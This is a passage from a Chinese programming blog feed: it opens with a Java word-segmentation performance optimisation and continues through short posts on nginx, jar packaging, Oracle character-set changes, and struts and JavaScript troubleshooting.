执行之前剩余内存:2423.3901-61.14509+60.505295=2422.7505
执行之后剩余内存:2423.3901-900.46466+726.91455=2249.84
cost time:77271 ms 
 
在上篇文章基于词典的正向最大匹配算法中，我们已经优化了词典查找算法（DIC.contains(tryWord)）的性能（百万次查询只要一秒左右的时间），即使经过优化后TrieV3仍然比HashSet慢4倍，也不影响它在分词算法中的作用，从上面的数据可以看到，TrieV3的整体分词性能领先HashSet十五个百分点（15%），而且内存占用只有HashSet的80%。
 
如何来优化分词算法呢？分词算法有什么问题吗？
 
回顾一下代码：
 
public static List<String> seg(String text){        
	List<String> result = new ArrayList<>();
	while(text.length()>0){
		int len=MAX_LENGTH;
		if(text.length()<len){
			len=text.length();
		}
		//取指定的最大长度的文本去词典里面匹配
		String tryWord = text.substring(0, 0+len);
		while(!DIC.contains(tryWord)){
			//如果长度为一且在词典中未找到匹配，则按长度为一切分
			if(tryWord.length()==1){
				break;
			}
			//如果匹配不到，则长度减一继续匹配
			tryWord=tryWord.substring(0, tryWord.length()-1);
		}
		result.add(tryWord);
		//从待分词文本中去除已经分词的文本
		text=text.substring(tryWord.length());
	}
	return result;
} 
 
分析一下算法复杂性，最坏情况为切分出来的每个词的长度都为一（即DIC.contains(tryWord)始终为false），因此算法的复杂度约为外层循环数*内层循环数（即 文本长度*最大词长）=25025017*16=400400272，以TrieV3的查找性能来说，4亿次查询花费的时间大约8分钟左右。
 
进一步查看算法，发现外层循环有2个substring方法调用，内层循环有1个substring方法调用，substring方法内部new了一个String对象，构造String对象的时候又调用了System.arraycopy来拷贝数组。
 
最坏情况下，25025017*2+25025017*16=50050034+400400272=450450306，需要构造4.5亿个String对象和拷贝4.5亿次数组。
 
怎么来优化呢？
 
除了我们不得不把切分出来的词加入result中外，其他的两个substring是可以去掉的。这样，最坏情况下我们需要构造的String对象个数和拷贝数组的次数就从4.5亿次降低为25025017次，只有原来的5.6%。
 
看看改进后的代码：
 
public static List<String> seg(String text){        
	List<String> result = new ArrayList<>();
	//文本长度
	final int textLen=text.length();
	//从未分词的文本中截取的长度
	int len=DIC.getMaxLength();
	//剩下未分词的文本的索引
	int start=0;
	//只要有词未切分完就一直继续
	while(start<textLen){
		if(len>textLen-start){
			//如果未分词的文本的长度小于截取的长度
			//则缩短截取的长度
			len=textLen-start;
		}
		//用长为len的字符串查词典
		while(!DIC.contains(text, start, len)){
			//如果长度为一且在词典中未找到匹配
			//则按长度为一切分
			if(len==1){
				break;
			}
			//如果查不到，则长度减一后继续
			len--;
		}
		result.add(text.substring(start, start+len));
		//从待分词文本中向后移动索引，滑过已经分词的文本
		start+=len;
		//每一次成功切词后都要重置截取长度
		len=DIC.getMaxLength();
	}
	return result;
}
public static List<String> segReverse(String text){        
	Stack<String> result = new Stack<>();
	//文本长度
	final int textLen=text.length();
	//从未分词的文本中截取的长度
	int len=DIC.getMaxLength();
	//剩下未分词的文本的索引
	int start=textLen-len;
	//处理文本长度小于最大词长的情况
	if(start<0){
		start=0;
	}
	if(len>textLen-start){
		//如果未分词的文本的长度小于截取的长度
		//则缩短截取的长度
		len=textLen-start;
	}
	//只要有词未切分完就一直继续
	while(start>=0 && len>0){
		//用长为len的字符串查词典
		while(!DIC.contains(text, start, len)){
			//如果长度为一且在词典中未找到匹配
			//则按长度为一切分
			if(len==1){
				break;
			}
			//如果查不到，则长度减一
			//索引向后移动一个字，然后继续
			len--;
			start++;
		}
		result.push(text.substring(start, start+len));
		//每一次成功切词后都要重置截取长度
		len=DIC.getMaxLength();            
		if(len>start){
			//如果未分词的文本的长度小于截取的长度
			//则缩短截取的长度
			len=start;
		}
		//每一次成功切词后都要重置开始索引位置
		//从待分词文本中向前移动最大词长个索引
		//将未分词的文本纳入下次分词的范围
		start-=len;
	}
	len=result.size();
	List<String> list = new ArrayList<>(len);
	for(int i=0;i<len;i++){
		list.add(result.pop());
	}
	return list;
}
 
对于正向最大匹配算法，代码行数从23增加为33，对于逆向最大匹配算法，代码行数从28增加为51，除了代码行数的增加，代码更复杂，可读性和可维护性也更差，这就是性能的代价！所以，不要过早优化，不要做不成熟的优化，因为不是所有的场合都需要高性能，在数据规模未达到一定程度的时候，各种算法和数据结构的差异表现不大，至少那个差异对你无任何影响。你可能会说，要考虑到明天，要考虑将来，你有你自己的道理，不过，我还是坚持不过度设计，不过早设计，通过单元测试和持续重构来应对变化，不为遥不可及的将来浪费今天，下一秒会发生什么谁知道呢？更不用说明天！因为有单元测试这张安全防护网，所以在出现性能问题的时候，我们可以放心、大胆、迅速地重构来优化性能。
 
下面看看改进之后的性能（对比TrieV3和HashSet的表现）：
 
开始初始化词典
dic.class=org.apdplat.word.dictionary.impl.TrieV3
dic.path=dic.txt
完成初始化词典，耗时689 毫秒，词数目：427452
词典最大词长：16
词长  0 的词数为：1
词长  1 的词数为：11581
词长  2 的词数为：146497
词长  3 的词数为：162776
词长  4 的词数为：90855
词长  5 的词数为：6132
词长  6 的词数为：3744
词长  7 的词数为：2206
词长  8 的词数为：1321
词长  9 的词数为：797
词长 10 的词数为：632
词长 11 的词数为：312
词长 12 的词数为：282
词长 13 的词数为：124
词长 14 的词数为：116
词长 15 的词数为：51
词长 16 的词数为：25
词典平均词长：2.94809
字符数目：24960301
分词耗时：24782 毫秒
分词速度：1007.0 字符/毫秒
执行之前剩余内存:2423.3901-61.14509+60.505272=2422.7505
执行之后剩余内存:2423.3901-732.0371+308.87476=2000.2278
cost time:25007 ms
 
开始初始化词典
dic.class=org.apdplat.word.dictionary.impl.HashSet
dic.path=dic.txt
完成初始化词典，耗时293 毫秒，词数目：427452
词典最大词长：16
词长  0 的词数为：1
词长  1 的词数为：11581
词长  2 的词数为：146497
词长  3 的词数为：162776
词长  4 的词数为：90855
词长  5 的词数为：6132
词长  6 的词数为：3744
词长  7 的词数为：2206
词长  8 的词数为：1321
词长  9 的词数为：797
词长 10 的词数为：632
词长 11 的词数为：312
词长 12 的词数为：282
词长 13 的词数为：124
词长 14 的词数为：116
词长 15 的词数为：51
词长 16 的词数为：25
词典平均词长：2.94809
字符数目：24960301
分词耗时：40913 毫秒
分词速度：610.0 字符/毫秒
执行之前剩余内存:907.8702-61.14509+60.505295=907.2304
执行之后剩余内存:907.8702-165.4784+123.30369=865.6955
cost time:40928 ms
 
可以看到分词算法优化的效果很明显，对于TrieV3来说，提升了2.5倍，对于HashSet来说，提升了1.9倍。我们看看HashSet的实现：
 
public class HashSet implements Dictionary{
    private Set<String> set = new java.util.HashSet<>();
    private int maxLength;
    @Override
    public int getMaxLength() {
        return maxLength;
    }
    @Override
    public boolean contains(String item, int start, int length) {
        return set.contains(item.substring(start, start+length));
    }
    @Override
    public boolean contains(String item) {
        return set.contains(item);
    }
    @Override
    public void addAll(List<String> items) {
        for(String item : items){
            add(item);
        }
    }
    @Override
    public void add(String item) {
        //去掉首尾空白字符
        item=item.trim();
        int len = item.length();
        if(len < 1){
            //长度小于1则忽略
            return;
        }
        if(len>maxLength){
            maxLength=len;
        }
        set.add(item);
    }
}
 
JDK的HashSet没有这里优化所使用的contains(String item, int start, int length)方法，所以用了substring，这是HashSet提速没有TrieV3大的原因之一。
 
看一下改进的算法和原来的算法的对比：
 
正向最大匹配算法： 
逆向最大匹配算法： 
 
 
代码托管于GITHUB
 
参考资料：
1、中文分词十年回顾
2、中文信息处理中的分词问题
3、汉语自动分词词典机制的实验研究
4、由字构词_中文分词新方法
5、汉语自动分词研究评述
 
NUTCH/HADOOP视频教程
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
使用nginx 遇到的问题, hw1287789687.iteye.com.blog.2064120, Thu, 08 May 2014 23:10:27 +0800

前段时间使用nginx把局域网内的web项目转发到公网(外网),遇到了一些问题
都是上传文件时遇到的
问题2:413 Request Entity Too Large
增加如下两行到nginx.conf的http{}段，增大nginx上传文件大小限制
client_max_body_size 30m;
 
client_body_buffer_size 128k;
 
问题1:504 Gateway Time-out
参考: http://forum.parallels.com/showthread.php?263798-Nginx-504-Gateway-Time-out
增加如下两行到nginx.conf的http{}段,增大超时时间
 
send_timeout 500;
proxy_read_timeout 500;
proxy_connect_timeout 500;
 
说明:单位是秒
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
删除jar包中的指定文件, hw1287789687.iteye.com.blog.2063620, Thu, 08 May 2014 11:10:45 +0800

如何删除jar包中的指定文件呢?
当然使用解压缩软件(rar,zip,7z)肯定没问题.但是我想自动化,图形界面的工具就无能为力了.
核心方法:
/***
	 * 删除jar包中的内容
	 * @param jarPath
	 * @param fileName : "META-INF/BCKEY.DSA"
	 * @throws IOException
	 * @throws ArchiveException
	 */
	public static void deleteFileInJar(String jarPath,String fileName) throws IOException, ArchiveException{
		List<String>fileNames=new ArrayList<String>();
		if(!ValueWidget.isNullOrEmpty(fileName)){
		fileNames.add(fileName);}
		deleteFileInJar(jarPath, fileNames);
	}
	/**
	 * 删除jar包中的内容
	 * @param jarPath
	 * @param fileNames : ["META-INF/BCKEY.DSA"],注意斜杠
	 * @throws IOException
	 * @throws ArchiveException
	 */
	public static void deleteFileInJar(String jarPath,List<String>fileNames) throws IOException, ArchiveException{
		List<ZipFileBean> zipFiles = CompressZipUtil
				.deCompressRecursionFileList(jarPath, "", true);
		List<ZipApkFile> zipApkFiles = extendZipFileBean(zipFiles,fileNames);
		CompressZipUtil.setPrint(false);
		File newFile=new File(jarPath + ".bak");
		while(newFile.exists()){
			//若bak文件存在,则循环修改名称,只到文件不存在
			System.out.println("file exist:"+newFile.getAbsolutePath());
			newFile=new File(jarPath + RandomUtils.getTimeRandom2());
		}
		CompressZipUtil.persistenceZip(newFile, zipApkFiles);
		File jarFile=new File(jarPath);
		
		System.out.println("delete old jar:"+jarFile.getAbsolutePath());
		boolean isSuccess=jarFile.delete();
		if(!isSuccess){
			System.out.println("删除失败:"+jarFile.getAbsolutePath());
		}else{
			System.out.println("modify name");
			newFile.renameTo(jarFile);
		}
	}
 使用说明:
比如我想删除jar(zip)包中的config\manual.properties
zip包结构: main方法如下:
 
public static void main(String[] args) throws IOException, ArchiveException {
		String jarPath="D:\\bin\\config\\config.zip";
		deleteFileInJar(jarPath, "config/manual.properties"/*"META-INF/BCKEY.DSA"*/);
		System.out.println("jarPath:"+jarPath);
		
	}
 测试项目(ios_push_deleteBCKEY_DSA)见附件
依赖的jar见附件
 
    本文附件下载:
    
      ios_push_deleteBCKEY_DSA.zip (7.2 KB)
io0007-find_progess-0.0.8-SNAPSHOT.jar (287.6 KB)
io0007-find_progess-0.0.8-SNAPSHOT-sources.jar (179.9 KB)
commons-compress-1.8.jar (356.1 KB)
is_chinese-0.0.2-SNAPSHOT-sources.jar (5.7 KB)
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
"proxy_pass" cannot have URI part in location given by regular expression, hw1287789687.iteye.com.blog.2063429, Wed, 07 May 2014 21:56:48 +0800

在windows中使用nginx时报错:
C:\TDDOWNLOAD\nginx-1.6.0\nginx-1.6.0>nginx.exe -s reload
nginx: [emerg] "proxy_pass" cannot have URI part in location given by regular expression, or inside named location, or inside "if" statement, or insid
e "limit_except" block in C:\TDDOWNLOAD\nginx-1.6.0\nginx-1.6.0/conf/nginx.conf:61
 
我的nginx配置如下:
location ~* \.(jsp|do)$
	  {
			index index.jsp;
			proxy_pass http://localhost:8080/shop_goods;
			proxy_set_header X-Real-IP $remote_addr;
		}
 为什么会报错呢?
因为location 使用了正则表达式(\.(jsp|do)$),而且proxy_pass中包含了URI part(shop_goods).错误提示的意思是:
如果location包含了正则表达式,则 "proxy_pass"不能包含URI part(shop_goods).
找到原因后,修改如下:
	location ~* \.(jsp|do)$
	  {
			index index.jsp;
			proxy_pass http://localhost:8080;
			proxy_set_header X-Real-IP $remote_addr;
		}
 注意:proxy_pass的值后面不要有斜杠,下面的是错误的:
proxy_pass http://localhost:8080/;
参考:http://huangkunlun520.blog.51cto.com/2562772/901974
nginx windows 安装包见附件
    本文附件下载:
    
      nginx-1.6.0.zip (1.2 MB)
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
spring 和hibernate项目制作可执行的jar包, hw1287789687.iteye.com.blog.2062224, Tue, 06 May 2014 17:02:02 +0800

spring 和hibernate项目制作可执行的jar包
如何把spring和hibernate项目制作可运行的jar包呢?
就是在命令行中运行 java -jar  xxx.jar 就可以运行java程序.例如 我的这个项目使用了hibernate和spring,不是web项目.
构建工具:maven
IDE:eclipse
目录结构如下: 
 
上图中beans.xml是spring的配置文件,内容如下:
 
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:context="http://www.springframework.org/schema/context"
	xmlns:aop="http://www.springframework.org/schema/aop" xmlns:tx="http://www.springframework.org/schema/tx"
	xsi:schemaLocation="http://www.springframework.org/schema/beans
           http://www.springframework.org/schema/beans/spring-beans-3.2.xsd
            http://www.springframework.org/schema/context
           http://www.springframework.org/schema/context/spring-context-3.2.xsd
           http://www.springframework.org/schema/aop
           http://www.springframework.org/schema/aop/spring-aop-3.2.xsd
           http://www.springframework.org/schema/tx 
           http://www.springframework.org/schema/tx/spring-tx-3.2.xsd"
	default-lazy-init="false">
<bean id="dataSource" destroy-method="close"
		class="org.apache.commons.dbcp.BasicDataSource">
		<property name="driverClassName" value="${jdbc.driverClassName}" />
		<property name="url" value="${jdbc.url}" />
		<property name="username" value="${jdbc.username}" />
		<property name="password" value="${jdbc.password}" />
	</bean>
	<bean
		class="org.springframework.beans.factory.config.PropertyPlaceholderConfigurer">
		<property name="locations">
			<value>classpath:jdbc.properties</value>
		</property>
	</bean>
	<bean id="sessionFactory"
		class="org.springframework.orm.hibernate3.LocalSessionFactoryBean">
		<property name="dataSource" ref="dataSource" />
		<!--<property name="packagesToScan"> <list> <value>com.pass.bean</value> 
			</list> </property> -->
		<property name="hibernateProperties">
			<props>
				<prop key="hibernate.dialect">
					org.hibernate.dialect.Oracle10gDialect
				</prop>
				<prop key="hibernate.default_schema">whuang</prop>
				<prop key="hibernate.cache.provider_class">
					org.hibernate.cache.EhCacheProvider
				</prop>
				<prop key="hibernate.cache.provider_configuration_file_resource_path">
					com/config/core/ehcache.xml
				</prop>
				<prop key="hibernate.cache.use_second_level_cache">true</prop>
				<prop key="hibernate.cache.use_query_cache">false</prop>
				<prop key="hibernate.cache.use_minimal_puts">true</prop>
				<!-- Cache complete -->
				<prop key="hibernate.order_updates">true</prop>
				<prop key="hibernate.generate_statistics">true</prop>
				
				<!-- org.hibernate.dialect.PostgreSQLDialect -->
				<prop key="hibernate.show_sql">false</prop>
				<prop key="hibernate.format_sql">true</prop>
				<prop key="hibernate.hbm2ddl.auto">update</prop>
				<prop key="hibernate.use_sql_comments">true</prop>
				<prop key="current_session_context_class">thread</prop>
				<prop key="javax.persistence.validation.mode">none</prop>
			</props>
		</property>
		<property name="mappingLocations">
			<list>
				<value>classpath:com/provider/mapping/*.hbm.xml</value>
			</list>
		</property>
	</bean>
	<bean id="txManager"
		class="org.springframework.orm.hibernate3.HibernateTransactionManager">
		<property name="sessionFactory" ref="sessionFactory"></property>
	</bean>
	<!-- 事务的注解，如 @Transactional(readOnly=true) <tx:annotation-driven transaction-manager="txManager" 
		/> -->
	
	<aop:config>
		<aop:pointcut id="bussinessService"
			expression="execution(public 
		* com.dao..*.*(..)) || execution(public 
		* com.common.dao.generic.*.*(..))" />
		<aop:advisor pointcut-ref="bussinessService" advice-ref="txAdvice" />
	</aop:config>
	<tx:advice id="txAdvice" transaction-manager="txManager">
		<tx:attributes>
			<tx:method name="load*" read-only="true" />
			<tx:method name="list*" read-only="true" />
			<tx:method name="get*" read-only="true" />
			<tx:method name="contain*" read-only="true" />
			<tx:method name="find*" read-only="true" />
			<tx:method name="test*" read-only="true" />
			<tx:method name="is*" read-only="true" />
			<tx:method name="show*" read-only="true" />
			<tx:method name="delete*" propagation="REQUIRED" />
			<tx:method name="update*" propagation="REQUIRED" />
			<tx:method name="save*" propagation="REQUIRED" />
			<tx:method name="add*" propagation="REQUIRED" />
			<tx:method name="add*" propagation="REQUIRED" />
			<tx:method name="set*" propagation="REQUIRED" />
			<tx:method name="verify*" read-only="true" />
			<tx:method name="max*" read-only="true" />
			<tx:method name="min*" read-only="true" />
			<tx:method name="dis*" read-only="true" />
		</tx:attributes>
	</tx:advice>
	
</beans>
 
 
jdbc.properties内容:
 
jdbc.driverClassName=oracle.jdbc.driver.OracleDriver
jdbc.url=jdbc:oracle:thin:@localhost:1521:whuang
jdbc.username=whuang
jdbc.password=whuang
 
 
如何打成可执行的jar包呢?
(1)修改读取spring配置文件的方式
在eclipse中使用
 
new ClassPathXmlApplicationContext("beans.xml", "dao.xml");
 打成jar包的话,要改成:
 
 
new FileSystemXmlApplicationContext("beans.xml", "dao.xml");
 
 
(2)修改beans.xml中读取jdbc.properties的方式
原来是:
 
<bean
		class="org.springframework.beans.factory.config.PropertyPlaceholderConfigurer">
		<property name="locations">
			<value>classpath:jdbc.properties</value>
		</property>
	</bean>
 打成jar,就需要改为:
 
 
<bean
		class="org.springframework.beans.factory.config.PropertyPlaceholderConfigurer">
		<property name="locations">
			<value>jdbc.properties</value>
		</property>
	</bean>
 
 
(3)maven中生成可执行jar的方式需要改maven plugin
原来使用
 
<plugin>
				<artifactId>maven-assembly-plugin</artifactId>
				<configuration>
					<appendAssemblyId>false</appendAssemblyId>
					<descriptorRefs>
						<descriptorRef>jar-with-dependencies</descriptorRef>
					</descriptorRefs>
					<archive>
						<manifest>
							<mainClass>com.jn.NotepadApp</mainClass>
						</manifest>
					</archive>
				</configuration>
				<executions>
					<execution>
						<id>make-assembly</id>
						<phase>package</phase>
						<goals>
							<goal>assembly</goal>
						</goals>
					</execution>
				</executions>
			</plugin>
 打成jar,就需要改为:
 
 
<plugin>
				<groupId>org.apache.maven.plugins</groupId>
				<artifactId>maven-shade-plugin</artifactId>
				<version>1.4</version>
				<executions>
					<execution>
						<phase>package</phase>
						<goals>
							<goal>shade</goal>
						</goals>
						<configuration>
							<transformers>
								<transformer
									implementation="org.apache.maven.plugins.shade.resource.ManifestResourceTransformer">
									<mainClass>com.jn.NotepadApp</mainClass>
								</transformer>
								<transformer
									implementation="org.apache.maven.plugins.shade.resource.AppendingTransformer">
									<resource>META-INF/spring.handlers</resource>
								</transformer>
								<transformer
									implementation="org.apache.maven.plugins.shade.resource.AppendingTransformer">
									<resource>META-INF/spring.schemas</resource>
								</transformer>
							</transformers>
						</configuration>
					</execution>
				</executions>
			</plugin>
 
 
打开cmd,进入项目所在目录
运行 mvn clean package -U
就可以生成jar包:original-hibernate_spring_executable-0.0.1-SNAPSHOT.jar和hibernate_spring_executable-0.0.1-SNAPSHOT.jar,不用管original-hibernate_spring_executable-0.0.1-SNAPSHOT.jar,
(4)此时还要删除jar包中的META-INF\BCKEY.DSA,否则报错:
Exception in thread "main" java.lang.SecurityException: Invalid signature file digest for Manifest main attributes
参考:http://hw1287789687.iteye.com/blog/2019501
注意:
(a)打成jar包后,需要把spring的配置文件拷贝到jar包同级目录,所以读取spring配置文件使用FileSystemXmlApplicationContext,而不是ClassPathXmlApplicationContext
 
 
(b)jdbc.properties也在jar同级目录,所以需要修改beans.xml中org.springframework.beans.factory.config.PropertyPlaceholderConfigurer配置,去掉classpath:.
(c)其实在生成的jar包中也有一份beans.xml,dao.xml.jdbc.properties, 做上述的修改(蓝色标记)只是为了让jar读取文件系统(与jar同级目录)中的配置文件,而不是jar包里面的配置文件.
 
已有 2 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
修改oracle 数据服务器编码, hw1287789687.iteye.com.blog.2059444, Sat, 03 May 2014 20:37:54 +0800

如何修改数据库oracle 的编码呢?
我使用的oracle的版本是:
Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit Production
 
我原来的编码是:ZHS16GBK
SQL> select userenv('language') from dual;
 
USERENV('LANGUAGE')
----------------------------------------------------
SIMPLIFIED CHINESE_CHINA.ZHS16GBK
 
SQL> select * from nls_database_parameters where PARAMETER='NLS_CHARACTERSET';
 
PARAMETER
------------------------------
VALUE
-------------------------------------------------------------------------------
NLS_CHARACTERSET
ZHS16GBK
 
使用oracle 客户端Navicat 时报错,因为数据库的编码.
我想把数据库的编码改为UTF-8
步骤如下:
C:\Users\huangwei>sqlplus /nolog
 
SQL*Plus: Release 11.2.0.1.0 Production on 星期六 5月 3 19:49:06 2014
 
Copyright (c) 1982, 2010, Oracle.  All rights reserved.
 
SQL> conn sys/root as sysdba
已连接。
SQL> SHUTDOWN IMMEDIATE
数据库已经关闭。
已经卸载数据库。
ORACLE 例程已经关闭。
SQL> STARTUP MOUNT;
ORACLE 例程已经启动。
 
Total System Global Area 2438529024 bytes
Fixed Size                  2178176 bytes
Variable Size            1375732608 bytes
Database Buffers         1040187392 bytes
Redo Buffers               20430848 bytes
数据库装载完毕。
SQL> ALTER SYSTEM ENABLE RESTRICTED SESSION;
 
系统已更改。
 
SQL> ALTER SYSTEM SET JOB_QUEUE_PROCESSES=0;
 
系统已更改。
 
SQL> ALTER SYSTEM SET AQ_TM_PROCESSES=0;
 
系统已更改。
 
SQL> ALTER DATABASE OPEN;
 
数据库已更改。
 
SQL> ALTER DATABASE CHARACTER SET INTERNAL_USE AL32UTF8;
 
数据库已更改。
 
SQL> ALTER DATABASE NATIONAL CHARACTER SET INTERNAL_USE AL16UTF16;
 
数据库已更改。
 
SQL> SHUTDOWN IMMEDIATE;
数据库已经关闭。
已经卸载数据库。
ORACLE 例程已经关闭。
SQL> STARTUP
ORACLE 例程已经启动。
 
Total System Global Area 2438529024 bytes
Fixed Size                  2178176 bytes
Variable Size            1375732608 bytes
Database Buffers         1040187392 bytes
Redo Buffers               20430848 bytes
数据库装载完毕。
数据库已经打开。
 
再次查看数据库的编码:
SQL> conn sys/root as sysdba
已连接。
SQL> select userenv('language') from dual;
 
USERENV('LANGUAGE')
--------------------------------------------------------------------------------
SIMPLIFIED CHINESE_CHINA.AL32UTF8
 
SQL> select * from nls_database_parameters where PARAMETER='NLS_CHARACTERSET';
 
PARAMETER
------------------------------------------------------------
VALUE
--------------------------------------------------------------------------------
NLS_CHARACTERSET
AL32UTF8
 
    本文附件下载:
    
      oracle学习笔记.zip (1.4 MB)
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
java web开发过程中出现的一些诡异问题(2), hw1287789687.iteye.com.blog.2056423, Tue, 29 Apr 2014 00:05:36 +0800

接着上一篇博客:http://hw1287789687.iteye.com/blog/2053907
(1)我们上周做一个web项目,修改bug后发增量包(补丁包),其实我喜欢发全量包,但是领导要求增量包(补丁包),没办法.
有次发增量包(补丁包),修改了一个常量类,发布后,仍然测出问题.纳闷:明明修改了常量类啊.反编译常量类,确实是修改过之后的,没问题.那么问题出在哪儿呢?
给大伙儿重现一下:
我这里有两个类
public class Constant {
	public static final String WHO="黄威";
	public static final int AGE=26;
}
public class Hello{
	public static void main(String[]args)
	{
		System.out.println("Hello,"+Constant.WHO);
	}
}
 在命令行中进行编译: 运行: 
然后我发一个增量包:只修改Constant类,修改Constant类的WHO变量:
public class Constant {
	public static final String WHO="黄威22222222222222";
	public static final int AGE=26;
}
 单独编译Constant:,然后运行Hello: 奇怪!!!为什么结果没有变呢?
预期的结果应该是:
Hello,黄威22222222222222
原因是:对于含有常量的类,javac编译时直接把常量的值替换进去了.
所以我们还得重新编译Hello: 测试代码见附件
 
(2)对于js动态增加的表格tr,IE浏览器不识别
我使用如下代码动态增加表格的行(tr):
var queryResultTable_obj=getTable();
			dataLength=tableContent.length;
			for(var i=0;i<dataLength;i++){
				var oneTr=tableContent[i];
				//alert(oneTr.realName);
				var newTr = document.createElement("tr");
			     var newTd0 = document.createElement("td");
			     var newTd1 = document.createElement("td");
			     var newTd2 = document.createElement("td");
			     var newTd3 = document.createElement("td");
			     var newTd4 = document.createElement("td");
			     newTd0.innerHTML =oneTr.realName;
			     newTd1.innerHTML =oneTr.email;
			     newTd2.innerHTML =oneTr.aaa;
			     newTd3.innerHTML =oneTr.bbb;
			     newTd4.innerHTML ="<a target='_blank' href=\""+"../mgmt/personDetail.action?realName="+oneTr.realName+"&email="+oneTr.email+"&query_time="+query_time+"\" >签到详情</a>"
			     
			     newTr.appendChild(newTd0);
			     newTr.appendChild(newTd1);
			     newTr.appendChild(newTd2);
			     newTr.appendChild(newTd3);
			     newTr.appendChild(newTd4);
			     
			     queryResultTable_obj.appendChild(newTr);
			     
			}
 在IE中使用queryResultTable_obj.rows.length 获取表格行的个数时竟然是0,但是在火狐和谷歌浏览器中都没有问题.
说明:queryResultTable_obj 是表格对象
 那么在IE中如何获取表格的行(tr)呢?
通过 var trs=queryResultTable_obj.getElementsByTagName("tr");//获取表格所有的行tr
如何动态删除表格的所有行(除了表头)呢?
//判断是否是IE浏览器
var userAgent = navigator.userAgent.toLowerCase();
	var browser=navigator.appName;
	var b_version=navigator.appVersion;
	//var version=b_version.split(";");
	//var trim_Version=version[1].replace(/[ ]/g,"");//firefox error
	var isIE9test=userAgent.indexOf("windows nt ")>0&&userAgent.indexOf("trident")>0&&browser=="Microsoft Internet Explorer";
	 //删除行
	 function deleteRow(){
		 	var queryResultTable_obj=getTable();
		   
		   if(isIE9test){//如果是IE浏览器
			   var trs=queryResultTable_obj.getElementsByTagName("tr");//获取表格所有的行tr
				  for(var i=1;i<trs.length;){
					  var trOne=trs[i];//表格的每一行
					  queryResultTable_obj.removeChild(trOne);//从表格中删除tr
				  }
		   }else{
			   var length= queryResultTable_obj.rows.length ; //表格最后一行索引
			  
			  while(length > 1){
				  length--;
				  if(length<1){
					  break;
				  }
				  queryResultTable_obj.deleteRow(length);
			   }
			 
		   }
	 }
 
    本文附件下载:
    
      zengliang.zip (1.5 KB)
已有 7 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
struts 设置默认 action, hw1287789687.iteye.com.blog.2054306, Thu, 24 Apr 2014 21:38:32 +0800

struts 如何设置默认action呢?
我要达到的目的是:访问不存在的action时自动跳转到默认的action
在struts.xml中添加:
 
<!-- 404页面 -->
		<default-action-ref name="notFound" />
<action name="notFound" class="com.common.action.error.NotFoundErrerAction">
			<result name="success">/error/not_found.jsp</result>
		</action>
 效果如下: action  aaa/xxx.action 不存在,所以自动跳转到了notFound.
 
 
但是现在有一个问题,如果我的url是http://localhost:8082/shop_goods/acc 时,界面如下: 这是为什么呢?
我检查我的web.xml发现struts 过滤器配置如下:
<filter>
    <filter-name>struts2</filter-name>
    <filter-class>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</filter-class>
  </filter>
  <filter-mapping>
    <filter-name>struts2</filter-name>
    <url-pattern>*.action</url-pattern>
  </filter-mapping>
 
所以struts只会处理url后缀名为action的,比如xxx.action,abc.action.
解决方法:struts 过滤器配置改为:
 
<filter>
    <filter-name>struts2</filter-name>
    <filter-class>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</filter-class>
  </filter>
<filter-mapping>
    <filter-name>struts2</filter-name>
    <url-pattern>/*</url-pattern>
  </filter-mapping>
 
 
修改之后的效果: 
 
如果struts过滤器非要使用*.action呢?
那么需要在web.xml中添加:
 
<error-page>
            <error-code>404</error-code>
            <location>/error/not_found.jsp</location>
        </error-page>
 这样,访问http://localhost:8082/shop_goods/acc 也会自动跳转到/error/not_found.jsp
 
注意:上述页面(/error/not_found.jsp)不能有struts 标签
 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
java web开发过程中出现的一些诡异问题, hw1287789687.iteye.com.blog.2053907, Thu, 24 Apr 2014 01:32:37 +0800

最近工作很忙,开发任务很大,遇到的问题也千奇百怪,现总结如下,希望能够帮到各位.
(1)设置struts 的默认action.目的是访问http://localhost:8080/shop_goods ,自动跳转到http://localhost:8080/shop_goods/loginInput.action 
于是我在struts 配置文件中增加了
<default-action-ref name="loginInput" />
 但是始终达不到目的,检查了好多遍,语法都没有问题,在网上看了好多资料,配置完全一样,但是还是跳转不到默认action.
最后才发现有猫腻.
我在web.xml中配置struts过滤器如下:
<filter>
<filter-name>struts2</filter-name>
<filter-class>
org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter
</filter-class>
</filter>
<filter-mapping>
<filter-name>struts2</filter-name>
<url-pattern>*.action</url-pattern>
</filter-mapping>
后来我把红色部分改为/*就好了.
 
(2)ssh项目,启动tomcat时报错
详细错误信息:
org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'sessionFactory' defined in class path resource [com/tdr/mbs/endpoint/config/core/dbenv.xml]: Invocation of init method failed; nested exception is org.hibernate.DuplicateMappingException: Duplicate class/entity mapping com.wh.service.LoginService
 意思就是tomcat启动时发现有两份com.wh.service.LoginService ,然后它就不知道到底要加载哪个class了.
为什么会这样呢?
我进到tomcat部署的项目的lib下一看,发现有两个不同版本的jar包:wh_service-0.0.1.jar,wh_service-0.0.2.jar
因为我的项目是使用maven构建,依赖的另一个模块也是我们开发的,而且在不断升级.从0.0.1升级到0.0.2时,原来的jar包没有删除.
此时如何解决呢?
(1)直接进入tomcat 部署的项目目录lib下,把旧版本的jar包删除;
(2)先把项目从eclipse中remove, 
 
然后clean,然后在add到eclipse的tomcat下 最后再启动tomcat.
 
